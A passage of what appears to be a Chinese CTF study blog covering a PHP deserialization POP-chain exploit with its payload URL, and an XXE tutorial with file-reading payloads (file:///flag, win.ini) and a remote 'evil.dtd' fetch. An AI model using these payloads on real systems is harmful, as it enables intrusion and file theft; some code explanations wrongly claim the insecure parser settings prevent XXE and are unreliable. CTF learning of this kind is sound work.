+<p>由于前面是40个x所以导致少了20个字符，所以需要后面来补上，<code>&quot;;s:3:&quot;age&quot;;s:28:&quot;11</code>这一部分刚好20个，后面由于有<code>&quot;</code>闭合了前面因此后面的参数就可以由我们自定义执行了。</p>
+<h4 id="POP链构造"><a href="#POP链构造" class="headerlink" title="POP链构造"></a>POP链构造</h4><p> 前面所讲解的序列化攻击更多的是魔术方法中出现一些利用的漏洞，因为自动调用而触发漏洞，但如果关键代码不在魔术方法中，而是在一个类的普通方法中。这时候可以通过寻找相同的函数名将类的属性和敏感函数的属性联系起来。</p>
+<p><strong>实列及讲解</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line"></span><br><span class="line">error_reporting(0);</span><br><span class="line">show_source(&quot;index.php&quot;);</span><br><span class="line"></span><br><span class="line">class w44m&#123;</span><br><span class="line"></span><br><span class="line">    private $admin = &#x27;aaa&#x27;;</span><br><span class="line">    protected $passwd = &#x27;123456&#x27;;</span><br><span class="line"></span><br><span class="line">    public function Getflag()&#123;</span><br><span class="line">        if($this-&gt;admin === &#x27;w44m&#x27; &amp;&amp; $this-&gt;passwd ===&#x27;08067&#x27;)&#123;</span><br><span class="line">            include(&#x27;flag.php&#x27;);</span><br><span class="line">            echo $flag;</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            echo $this-&gt;admin;</span><br><span class="line">            echo $this-&gt;passwd;</span><br><span class="line">            echo &#x27;nono&#x27;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class w22m&#123;</span><br><span class="line">    public $w00m;</span><br><span class="line">    public function __destruct()&#123;</span><br><span class="line">        echo $this-&gt;w00m;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class w33m&#123;</span><br><span class="line">    public $w00m;</span><br><span class="line">    public $w22m;</span><br><span class="line">    public function __toString()&#123;</span><br><span class="line">        $this-&gt;w00m-&gt;&#123;$this-&gt;w22m&#125;();</span><br><span class="line">        return 0;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$w00m = $_GET[&#x27;w00m&#x27;];</span><br><span class="line">unserialize($w00m);</span><br><span class="line"></span><br><span class="line">?&gt; </span><br></pre></td></tr></table></figure>
+
+<p>首先观察一下整段代码，<code>w44m</code>类里面的<code>Getflag</code>函数可以用来读取flag，因此就将它作为这条链子的尾部。</p>
+<p>再想一下如何去调用这个函数，<code>$this-&gt;w00m-&gt;&#123;$this-&gt;w22m&#125;();</code>会调用函数，所以只需要给<code>$w00m</code>赋一个<code>w44m</code>类，然后再给<code>w22m</code>赋一个<code>Getflag</code>就能成功调用该函数。</p>
+<p>还差谁？<code>w33m</code>。再考虑一下如何调用这个<code>w33m</code>类呢？<code>__toString()</code>方法会在一个对象被当作字符串时被调用，于是我们就能看到下面<code>w22m</code>这个类里面的<code>echo</code>函数。我们只要给<code>w00m</code>赋一个<code>w33m</code>类，就能调用。</p>
+<p>构造exp：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class w44m&#123;</span><br><span class="line">    private $admin=&#x27;w44m&#x27;;</span><br><span class="line">    protected $passwd=&#x27;08067&#x27;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class w22m&#123;</span><br><span class="line">    public $w00m;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class w33m&#123;</span><br><span class="line">    public $w00m;</span><br><span class="line">    public $w22m;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a=new w22m;</span><br><span class="line">$a-&gt;w00m=new w33m;</span><br><span class="line">$a-&gt;w00m-&gt;w00m=new w44m;</span><br><span class="line">$a-&gt;w00m-&gt;w22m=&#x27;Getflag&#x27;;</span><br><span class="line"></span><br><span class="line">echo urlencode(serialize($a));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>输出为：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">O%3A4%3A%22w22m%22%3A1%3A%7Bs%3A4%3A%22w00m%22%3BO%3A4%3A%22w33m%22%3A2%3A%7Bs%3A4%3A%22w00m%22%3BO%3A4%3A%22w44m%22%3A2%3A%7Bs%3A11%3A%22%00w44m%00admin%22%3Bs%3A4%3A%22w44m%22%3Bs%3A9%3A%22%00%2A%00passwd%22%3Bs%3A5%3A%2208067%22%3B%7Ds%3A4%3A%22w22m%22%3Bs%3A7%3A%22Getflag%22%3B%7D%7D</span><br></pre></td></tr></table></figure>
+
+<p>最终WP：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">url/?w00m=O%3A4%3A%22w22m%22%3A1%3A%7Bs%3A4%3A%22w00m%22%3BO%3A4%3A%22w33m%22%3A2%3A%7Bs%3A4%3A%22w00m%22%3BO%3A4%3A%22w44m%22%3A2%3A%7Bs%3A11%3A%22%00w44m%00admin%22%3Bs%3A4%3A%22w44m%22%3Bs%3A9%3A%22%00%2A%00passwd%22%3Bs%3A5%3A%2208067%22%3B%7Ds%3A4%3A%22w22m%22%3Bs%3A7%3A%22Getflag%22%3B%7D%7D</span><br></pre></td></tr></table></figure>
+
+]]></content>
+      <categories>
+        <category>php</category>
+      </categories>
+      <tags>
+        <tag>php</tag>
+        <tag>unserialization</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>XXE学习记录</title>
+    <url>/2024/03/11/XXE%E6%BC%8F%E6%B4%9E/</url>
+    <content><![CDATA[<p>前言：</p>
+<p>上上周的青少年CTF擂台挑战赛 2024 #Round 1中，有一道XXE的题目，结合我对movectf那道XXE的印象，感觉都是直接复制、黏贴答案模板后改改就出了，没有系统的认真学；趁着有想法的时候把XXE系统学个一遍。。。</p>
+<h1 id="XXE"><a href="#XXE" class="headerlink" title="XXE"></a>XXE</h1><h2 id="什么是-XXE？"><a href="#什么是-XXE？" class="headerlink" title="什么是 XXE？"></a>什么是 XXE？</h2><p>XXE全称是：XML External Entity，也就是XML外部实体注入攻击，由于程序在解析输入的XML数据时，解析了攻击者伪造的外部实体而产生的。有XXE漏洞的标志性函数为<code>simplexml_load_string()</code>。漏洞是在对不安全的外部实体数据进行处理时引发的安全问题。</p>
+<span id="more"></span>
+
+<h2 id="XML-基础学习（-XXE-要从认识-XML-开始）："><a href="#XML-基础学习（-XXE-要从认识-XML-开始）：" class="headerlink" title="XML 基础学习（ XXE 要从认识 XML 开始）："></a>XML 基础学习（ XXE 要从认识 XML 开始）：</h2><p>XML指可扩展标记语言（EXtensible Markup Language）是一种标记语言，很类似 HTML。XML的设计宗旨是传输数据，而非显示数据。XML标签没有被预定义。需要自行定义标签。XML被设计为具有自我描述性。XML是 W3C 的推荐标准。</p>
+<h3 id="XML-是不作为的："><a href="#XML-是不作为的：" class="headerlink" title="XML 是不作为的："></a>XML 是不作为的：</h3><p>也许这有点难以理解，但是 XML 不会做任何事情。XML 被设计用来结构化、存储以及传输信息。</p>
+<p>下面是 John 写给 George 的便签，存储为 XML ：</p>
+<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">note</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">to</span>&gt;</span>George<span class="tag">&lt;/<span class="name">to</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">from</span>&gt;</span>John<span class="tag">&lt;/<span class="name">from</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">heading</span>&gt;</span>Reminder<span class="tag">&lt;/<span class="name">heading</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span>Don&#x27;t forget the meeting!<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">note</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>上面的这条便签具有自我描述性。它拥有标题以及留言，同时包含了发送者和接受者的信息。但是，这个 XML 文档仍然没有做任何事情。它仅仅是包装在 XML 标签中的纯粹的信息。我们需要编写软件或者程序，才能传送、接收和显示出这个文档。除此之外，XML 是纯文本，且允许创作者定义自己的标签和文档结构，是独立于软件和硬件的信息传输工具。</p>
+<h2 id="DTD-："><a href="#DTD-：" class="headerlink" title="DTD ："></a>DTD ：</h2><p>文档类型定义（DTD）可定义合法的 XML 文档构建模块。它使用一系列合法的元素来定义文档的结构。</p>
+<p>DTD 可被成行地声明于 XML 文档中，也可作为一个外部引用。</p>
+<h3 id="一些前置XML元素知识："><a href="#一些前置XML元素知识：" class="headerlink" title="一些前置XML元素知识："></a>一些前置XML元素知识：</h3><h4 id=""><a href="#" class="headerlink" title="&lt;!ELEMENT&gt;"></a><code>&lt;!ELEMENT&gt;</code></h4><p>在XML中，<code>&lt;!ELEMENT&gt;</code> 元素用于定义元素的结构和内容模型。具体来说，<code>&lt;!ELEMENT&gt;</code> 元素可以用来：</p>
+<ol>
+<li>定义元素的名称：<code>&lt;!ELEMENT&gt;</code> 元素指定了XML文档中允许出现的元素的名称。</li>
+<li>定义元素的内容模型：<code>&lt;!ELEMENT&gt;</code> 元素可以指定元素的内容模型，即元素可以包含哪些子元素以及它们的顺序和数量。</li>
+</ol>
+<p>例如，下面是一个使用 <code>&lt;!ELEMENT&gt;</code> 元素定义元素的示例：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!ELEMENT person (firstname, lastname, age)&gt;</span><br></pre></td></tr></table></figure>
+
+<p>在这个示例中，<code>&lt;!ELEMENT&gt;</code> 元素定义了一个名为”person”的元素，它包含了三个子元素：firstname、lastname 和 age。这样就规定了”person”元素的结构和内容模型。</p>
+<p>通过使用 <code>&lt;!ELEMENT&gt;</code> 元素，可以在XML文档中明确定义元素的结构，有助于确保文档的有效性和一致性。</p>
+<h4 id="-1"><a href="#-1" class="headerlink" title="&lt;!ENTITY&gt;"></a><code>&lt;!ENTITY&gt;</code></h4><p>在XML中，<code>&lt;!ENTITY&gt;</code> 元素用于定义实体。</p>
+<h3 id="内部的-DOCTYPE-声明："><a href="#内部的-DOCTYPE-声明：" class="headerlink" title="内部的 DOCTYPE 声明："></a>内部的 DOCTYPE 声明：</h3><p>假如 DTD 被包含在您的 XML 源文件中，它应当通过下面的语法包装在一个 DOCTYPE 声明中：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE 根元素 [元素声明]&gt;</span><br></pre></td></tr></table></figure>
+
+<p>带有 DTD 的 XML 文档实例：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE note [</span><br><span class="line">  &lt;!ELEMENT note (to,from,heading,body)&gt;</span><br><span class="line">  &lt;!ELEMENT to      (#PCDATA)&gt;</span><br><span class="line">  &lt;!ELEMENT from    (#PCDATA)&gt;</span><br><span class="line">  &lt;!ELEMENT heading (#PCDATA)&gt;</span><br><span class="line">  &lt;!ELEMENT body    (#PCDATA)&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;note&gt;</span><br><span class="line">	&lt;to&gt;George&lt;/to&gt;</span><br><span class="line">	&lt;from&gt;John&lt;/from&gt;</span><br><span class="line">	&lt;heading&gt;Reminder&lt;/heading&gt;</span><br><span class="line">	&lt;body&gt;Don not forget the meeting!&lt;/body&gt;</span><br><span class="line">&lt;/note&gt;</span><br></pre></td></tr></table></figure>
+
+<h4 id="以上-DTD-解释如下："><a href="#以上-DTD-解释如下：" class="headerlink" title="以上 DTD 解释如下："></a>以上 DTD 解释如下：</h4><p><strong>!DOCTYPE note</strong> (第二行)定义此文档是 <strong>note</strong> 类型的文档（note为根元素）。</p>
+<p><strong>!ELEMENT note</strong> (第三行)定义 <strong>note</strong> 元素有四个元素：”to、from、heading、body”，如果是<code>&lt;!ELEMENT note ANY&gt;</code>则表示可以接受<strong>任何元素</strong></p>
+<p><strong>!ELEMENT to</strong> (第四行)定义 <strong>to</strong> 元素为 “#PCDATA” 类型</p>
+<p><strong>!ELEMENT from</strong> (第五行)定义 <strong>from</strong> 元素为 “#PCDATA” 类型</p>
+<p><strong>!ELEMENT heading</strong> (第六行)定义 <strong>heading</strong> 元素为 “#PCDATA” 类型</p>
+<p><strong>!ELEMENT body</strong> (第七行)定义 <strong>body</strong> 元素为 “#PCDATA” 类型</p>
+<h3 id="外部文档声明："><a href="#外部文档声明：" class="headerlink" title="外部文档声明："></a>外部文档声明：</h3><p>假如 DTD 位于 XML 源文件的外部，那么它应通过下面的语法被封装在一个 DOCTYPE 定义中：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE 根元素 SYSTEM &quot;文件名&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+<p>这个 XML 文档和上面的 XML 文档相同，但是拥有一个外部的 DTD: </p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE note SYSTEM &quot;note.dtd&quot;&gt;</span><br><span class="line">&lt;note&gt;</span><br><span class="line">	&lt;to&gt;George&lt;/to&gt;</span><br><span class="line">	&lt;from&gt;John&lt;/from&gt;</span><br><span class="line">	&lt;heading&gt;Reminder&lt;/heading&gt;</span><br><span class="line">	&lt;body&gt;Don not forget the meeting!&lt;/body&gt;</span><br><span class="line">&lt;/note&gt; </span><br></pre></td></tr></table></figure>
+
+<p>这是包含 DTD 的 “note.dtd” 文件：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!ELEMENT note (to,from,heading,body)&gt;</span><br><span class="line">&lt;!ELEMENT to (#PCDATA)&gt;</span><br><span class="line">&lt;!ELEMENT from (#PCDATA)&gt;</span><br><span class="line">&lt;!ELEMENT heading (#PCDATA)&gt;</span><br><span class="line">&lt;!ELEMENT body (#PCDATA)&gt;</span><br></pre></td></tr></table></figure>
+
+<h3 id="DTD的作用："><a href="#DTD的作用：" class="headerlink" title="DTD的作用："></a>DTD的作用：</h3><ul>
+<li>通过 DTD，您的每一个 XML 文件均可携带一个有关其自身格式的描述。</li>
+<li>通过 DTD，独立的团体可一致地使用某个标准的 DTD 来交换数据。</li>
+<li>您的应用程序也可使用某个标准的 DTD 来验证从外部接收到的数据。</li>
+<li>您还可以使用 DTD 来验证您自身的数据。</li>
+</ul>
+<h3 id="实体："><a href="#实体：" class="headerlink" title="实体："></a>实体：</h3><p>实体可以理解为变量，其必须在DTD中定义申明，可以在文档中的其他位置引用该变量的值。</p>
+<h4 id="实体类别与引用："><a href="#实体类别与引用：" class="headerlink" title="实体类别与引用："></a>实体类别与引用：</h4><h5 id="通用实体："><a href="#通用实体：" class="headerlink" title="通用实体："></a>通用实体：</h5><p>用 <code>&amp;实体名;</code> 引用的实体，他在 DTD 中定义，在 XML 文档中引用</p>
+<p>实例</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; </span><br><span class="line">&lt;!DOCTYPE updateProfile [</span><br><span class="line">    &lt;!ENTITY file SYSTEM &quot;file:///c:/windows/win.ini&quot;&gt; </span><br><span class="line">]&gt; </span><br><span class="line">&lt;updateProfile&gt;  </span><br><span class="line">    &lt;firstname&gt;Joe&lt;/firstname&gt;  </span><br><span class="line">    &lt;lastname&gt;&amp;file;&lt;/lastname&gt;  </span><br><span class="line">    ... </span><br><span class="line">&lt;/updateProfile&gt;</span><br></pre></td></tr></table></figure>
+
+<p>在这个例子中，实体 <code>&amp;file;</code> 引用了位于”file:&#x2F;&#x2F;&#x2F;c:&#x2F;windows&#x2F;win.ini”路径下的文件。</p>
+<h5 id="参数实体："><a href="#参数实体：" class="headerlink" title="参数实体："></a>参数实体：</h5><p>使用 <code>% 实体名</code>（<strong>这里面空格不能少</strong>） 在 DTD 中定义，并且<strong>只能在 DTD 中使用 <code>%实体名;</code> 引用</strong><br>只有在 DTD 文件中，参数实体的声明才能引用其他实体<br>和通用实体一样，参数实体也可以外部引用</p>
+<p>实例</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE note [</span><br><span class="line">    &lt;!ENTITY % an-element &quot;&lt;!ELEMENT mytag (subtag)&gt;&quot;&gt; </span><br><span class="line">    &lt;!ENTITY % remote-dtd SYSTEM &quot;http://somewhere.example.org/remote.dtd&quot;&gt; </span><br><span class="line">]&gt;</span><br><span class="line">&lt;note&gt;</span><br><span class="line">    &lt;message&gt;%an-element; %remote-dtd;&lt;/message&gt;</span><br><span class="line">&lt;/note&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>在这个示例中：</p>
+<p>第一个参数实体定义如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!ENTITY % an-element &quot;&lt;!ELEMENT mytag (subtag)&gt;&quot;&gt;</span><br></pre></td></tr></table></figure>
+<p>这个参数实体名为”an-element”，其内容是一个用于定义元素结构的字符串，指定了一个名为”mytag”的元素，它包含一个名为”subtag”的子元素。</p>
+<p>第二个参数实体定义如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!ENTITY % remote-dtd SYSTEM &quot;http://somewhere.example.org/remote.dtd&quot;&gt;</span><br></pre></td></tr></table></figure>
+<p>这个参数实体名为”remote-dtd”，其内容是一个外部实体引用，指定了一个外部DTD文件的位置。</p>
+<p>通过使用参数实体，我们可以在XML文档中定义可重复使用的片段，提高文档的可读性和可维护性。</p>
+<p>实体根据引用方式，还可分为内部实体与外部实体</p>
+<h5 id="内部实体："><a href="#内部实体：" class="headerlink" title="内部实体："></a>内部实体：</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!ENTITY 实体名称 &quot;实体的值&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+<p>实例：</p>
+<p>DTD：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!ENTITY writer &quot;Bill Gates&quot;&gt;</span><br><span class="line">&lt;!ENTITY copyright &quot;Copyright W3School.com.cn&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+<p>XML：</p>
+<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">author</span>&gt;</span><span class="symbol">&amp;writer;</span><span class="symbol">&amp;copyright;</span><span class="tag">&lt;/<span class="name">author</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>注释：别忘记一个通用实体由三部分构成：一个和号 ( <code>&amp;</code> )，一个<code>实体名称</code>， 以及一个分号 ( <code>;</code> )</p>
+<h5 id="外部实体"><a href="#外部实体" class="headerlink" title="外部实体:"></a>外部实体:</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!ENTITY 实体名称 SYSTEM &quot;URI&quot;&gt;</span><br></pre></td></tr></table></figure>
+<p>URL中能写哪些类型的外部实体呢？如图所示：</p>
+<p><img src="https://s2.loli.net/2023/12/20/WiJR52dgfnx9Dpb.png" alt="image-20231008193523097"></p>
+<p>实列：</p>
+<p>DTD：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!ENTITY writer SYSTEM &quot;http://www.w3school.com.cn/dtd/entities.dtd&quot;&gt;</span><br><span class="line">&lt;!ENTITY copyright SYSTEM &quot;http://www.w3school.com.cn/dtd/entities.dtd&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+<p>XML：</p>
+<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">author</span>&gt;</span><span class="symbol">&amp;writer;</span><span class="symbol">&amp;copyright;</span><span class="tag">&lt;/<span class="name">author</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>当然，还有一种引用方式是使用 引用 <strong>公用 DTD</strong> 的方法，语法如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE 根元素名称 PUBLIC &quot;DTD标识名&quot; &quot;公用DTD的URI&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+<p>这个在我们的攻击中也可以起到和 <code>SYSTEM</code> 一样的作用</p>
+<h4 id="XML外部实体注入："><a href="#XML外部实体注入：" class="headerlink" title="XML外部实体注入："></a>XML外部实体注入：</h4><p>XML External Entity Injection 即 xml 外部实体注入漏洞，简称XXE漏洞。XXE是针对解析XML输入的应用程序的一种攻击。 当弱配置的XML解析器处理包含对外部实体的引用的XML输入时，就会发生此攻击。 这种攻击可能导致信息泄露，命令执行，拒绝服务，SSRF，内网端口扫描以及其他系统影响。</p>
+<h5 id="有回显读敏感文件"><a href="#有回显读敏感文件" class="headerlink" title="有回显读敏感文件"></a>有回显读敏感文件</h5><p>本题为 ctfshow web 373 题的源码：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2021-01-07 12:59:52</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2021-01-07 13:36:47</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">libxml_disable_entity_loader</span>(<span class="literal">false</span>);</span><br><span class="line"><span class="variable">$xmlfile</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$xmlfile</span>))&#123;</span><br><span class="line">    <span class="variable">$dom</span> = <span class="keyword">new</span> <span class="title class_">DOMDocument</span>();</span><br><span class="line">    <span class="variable">$dom</span>-&gt;<span class="title function_ invoke__">loadXML</span>(<span class="variable">$xmlfile</span>, LIBXML_NOENT | LIBXML_DTDLOAD);</span><br><span class="line">    <span class="variable">$creds</span> = <span class="title function_ invoke__">simplexml_import_dom</span>(<span class="variable">$dom</span>);</span><br><span class="line">    <span class="variable">$ctfshow</span> = <span class="variable">$creds</span>-&gt;ctfshow;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$ctfshow</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure>
+
+<p>以下是代码的简要解释：</p>
+<ol>
+<li><code>error_reporting(0);</code> - 禁用错误报告，这意味着将不会显示任何错误信息。</li>
+<li><code>libxml_disable_entity_loader(false);</code> - 启用XML实体加载器，这是为了防止XML外部实体注入攻击。</li>
+<li><code>$xmlfile = file_get_contents(&#39;php://input&#39;);</code> - 从输入中获取XML文件的内容。</li>
+<li><code>if(isset($xmlfile))&#123;...&#125;</code> - 检查是否成功获取XML文件内容。</li>
+<li><code>$dom = new DOMDocument();</code> - 创建一个新的DOMDocument对象，用于处理XML文档。</li>
+<li><code>$dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);</code> - 加载XML文件内容到DOMDocument对象中，并禁用实体和DTD加载，以防止实体注入攻击。</li>
+<li><code>$creds = simplexml_import_dom($dom);</code> - 将DOMDocument对象转换为SimpleXMLElement对象，以便于访问XML数据。</li>
+<li><code>$ctfshow = $creds-&gt;ctfshow;</code> - 从XML数据中提取ctfshow元素的值。</li>
+<li><code>echo $ctfshow;</code> - 将ctfshow元素的值输出到页面上。</li>
+<li><code>highlight_file(__FILE__);</code> - 在页面上高亮显示当前PHP文件的源代码。</li>
+</ol>
+<p>贴个payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE Ed3n [</span><br><span class="line">&lt;!ELEMENT Ed3n ANY&gt;</span><br><span class="line">	&lt;!ENTITY payload SYSTEM &quot;file:///flag&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;Ed3n&gt;</span><br><span class="line">	&lt;ctfshow&gt;&amp;payload;&lt;/ctfshow&gt;</span><br><span class="line">&lt;/Ed3n&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://s2.loli.net/2024/03/11/YxXB7c3PtpydFEr.png" alt="image-20240311181553404"></p>
+<p>但我看到了 K0rz3n 佬读取复杂文件名的操作，感觉分别可以应用在读取Linux和Windows的flag上。</p>
+<p>以下为主要内容摘要：</p>
+<blockquote>
+<blockquote>
+<p>有些内容可能<strong>不想让解析引擎解析</strong>执行，而是当做原始的内容处理，用于把整段数据解析为纯字符数据而不是标记的情况包含大量的 <code>&lt; &gt; &amp; &quot;</code>  字符，CDATA 元素中的所有字符都会被当做元素字符数据的常量部分，而不是 xml 标记</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;![CDATA[</span><br><span class="line">XXXXXXXXXXXXXXXXX</span><br><span class="line">]]&gt;</span><br></pre></td></tr></table></figure>
+
+<p>可以输入任意字符除了 <code>]]&gt;</code> 不能嵌套<br>用处是万一某个标签内容包含特殊字符或者不确定字符，我们可以用 CDATA 包起来</p>
+</blockquote>
+<p>那我们把我们的读出来的数据放在 CDATA 中输出就能进行绕过，但是怎么做到，我们来简答的分析一下：</p>
+<p>首先，找到问题出现的地方，问题出现在</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&gt;...</span><br><span class="line">&gt;&lt;!ENTITY goodies SYSTEM &quot;file:///c:/windows/system.ini&quot;&gt; ]&gt;</span><br><span class="line">&gt;&lt;creds&gt;&amp;goodies;&lt;/creds&gt;</span><br></pre></td></tr></table></figure>
+
+<p>引用并不接受可能会引起 xml 格式混乱的字符（在XML中，有时实体内包含了些字符，如<code>&amp;,&lt;,&gt;,&quot;,&#39;</code>等。这些均需要对其进行转义，否则会对XML解释器生成错误），我们想在引用的两边加上 <code>&quot;&lt;![CDATA[&quot;和 “]]&gt;”</code> ，但是好像没有任何语法告诉我们字符串能拼接的，于是我想到了能不能使用多个实体连续引用的方法</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&gt;&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="line">&gt;&lt;!DOCTYPE roottag [</span><br><span class="line">  &lt;!ENTITY % start &quot;&lt;![CDATA[&quot;&gt;</span><br><span class="line">  &lt;!ENTITY % goodies SYSTEM &quot;file:///d:/test.txt&quot;&gt;</span><br><span class="line">  &lt;!ENTITY % end &quot;]]&gt;&quot;&gt;</span><br><span class="line">&gt;]&gt;</span><br><span class="line">&gt;&lt;roottag&gt;&amp;start;&amp;goodies;&amp;end;&lt;/roottag&gt;</span><br></pre></td></tr></table></figure>
+
+<p>注意，这里面的三个实体都是字符串形式，连在一起居然报错了，这说明我们不能在 xml 中进行拼接，而是需要在拼接以后再在xml 中调用，那么要想在 DTD 中拼接，我们知道我们只有一种选择，就是使用参数实体</p>
+</blockquote>
+<p>那我们把我们的读出来的数据放在 CDATA 中输出就能进行绕过</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE roottag [</span><br><span class="line">    &lt;!ENTITY % start &quot;&lt;![CDATA[&quot;&gt;</span><br><span class="line">    &lt;!ENTITY % goodies SYSTEM &quot;file:///d:/test.txt&quot;&gt;</span><br><span class="line">    &lt;!ENTITY % end &quot;]]&gt;&quot;&gt;</span><br><span class="line">    &lt;!ENTITY % dtd SYSTEM &quot;http://ip/evil.dtd&quot;&gt;</span><br><span class="line">    %dtd;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;roottag&gt;&amp;all;&lt;/roottag&gt;</span><br></pre></td></tr></table></figure>
+
+<p><strong>evil.dtd</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt; </span><br><span class="line">&lt;!ENTITY all &quot;%start;%goodies;%end;&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+<p>解释：</p>
+<p><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</code>：指定XML版本为1.0，字符编码为UTF-8。</p>
+<p><code>&lt;!DOCTYPE roottag [...]&gt;</code>：定义了名为”roottag”的根元素，并在内部包含了一组实体定义。</p>
+<p><code>&lt;!ENTITY % start &quot;&lt;![CDATA[&quot;&gt;</code>：定义了名为”start”的参数实体，内容为”&lt;![CDATA[“，用于表示CDATA块的起始部分。</p>
+<p><code>&lt;!ENTITY % goodies SYSTEM &quot;file:///d:/test.txt&quot;&gt;</code>：定义了名为”goodies”的参数实体，指向本地文件”d:&#x2F;test.txt”，用于引入外部实体内容。</p>
+<p> <code>&lt;!ENTITY % end &quot;]]&gt;&quot;&gt;</code>：定义了名为”end”的参数实体，内容为”]]&gt;”,用于表示CDATA块的结束部分。</p>
